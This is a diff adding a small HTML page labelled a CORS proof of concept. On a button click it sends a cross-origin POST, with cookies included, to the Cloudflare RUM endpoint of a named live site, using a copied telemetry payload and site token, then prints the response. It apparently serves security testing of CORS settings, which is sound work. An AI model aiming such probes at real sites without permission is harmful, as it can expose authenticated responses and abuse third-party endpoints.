@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC Test</title>
+</head>
+<body>
+    <h2>CORS PoC Test - Sending POST to /cdn-cgi/rum</h2>
+    <button onclick="sendRequest()">Send Request</button>
+    <pre id="output"></pre>
+
+    <script>
+        function sendRequest() {
+            const url = 'https://fico-ytl.com/cdn-cgi/rum'; 
+            const payload = {
+                "referrer": "",
+                "eventType": 3,
+                "versions": {
+                    "js": "2024.6.1",
+                    "fl": "2025.4.0-1-g37f21b1"
+                },
+                "pageloadId": "01a4c4eb-05dc-4cd0-899d-2d10668d9ce2",
+                "location": "https://fico-ytl.com/", 
+                "landingPath": "/",
+                "startTime": 1747576980313.6,
+                "nt": "navigate",
+                "serverTimings": [{
+                    "name": "cfCacheStatus",
+                    "dur": 0,
+                    "desc": "DYNAMIC"
+                }],
+                "siteToken": "fc43ceef36ee4803bab5b43e5f326ff0",
+                "lcp": {
+                    "value": 18560,
+                    "path": "/",
+                    "element": "div.flex.flex-col.gap-2>p.text-5xl.font-bold",
+                    "size": 23691,
+                    "rld": 0,
+                    "rlt": 0,
+                    "erd": 16861.200000001118,
+                    "fp": null
+                },
+                "fid": {
+                    "value": -1
+                },
+                "cls": {
+                    "value": 0.02036225244341564,
+                    "path": "/",
+                    "element": "",
+                    "currentRect": {
+                        "x": 220,
+                        "y": 746,
+                        "width": 1480,
+                        "height": 334,
+                        "top": 746,
+                        "right": 1700,
+                        "bottom": 1080,
+                        "left": 220
+                    },
+                    "previousRect": {
+                        "x": 220,
+                        "y": 910,
+                        "width": 1480,
+                        "height": 170,
+                        "top": 910,
+                        "right": 1700,
+                        "bottom": 1080,
+                        "left": 220
+                    }
+                },
+                "fcp": {
+                    "value": 9800,
+                    "path": "/"
+                },
+                "ttfb": {
+                    "value": 1698.7999999988824,
+                    "path": "/"
+                },
+                "inp": {
+                    "value": -1
+                },
+                "timingsV2": {
+                    "transferSize": 180183,
+                    "decodedBodySize": 179883
+                },
+                "dt": "",
+                "st": 1
+            };
+
+            fetch(url, {
+                method: 'POST',
+                credentials: 'include', // Important for sending cookies
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                document.getElementById('output').textContent += 'Response Status: ' + response.status + '\n';
+                return response.text();
+            })
+            .then(text => {
+                document.getElementById('output').textContent += 'Response Body:\n' + text + '\n';
+            })
+            .catch(error => {
+                document.getElementById('output').textContent += 'Error:\n' + error + '\n';
+            });
+        }
+    </script>
+</body>
+</html>
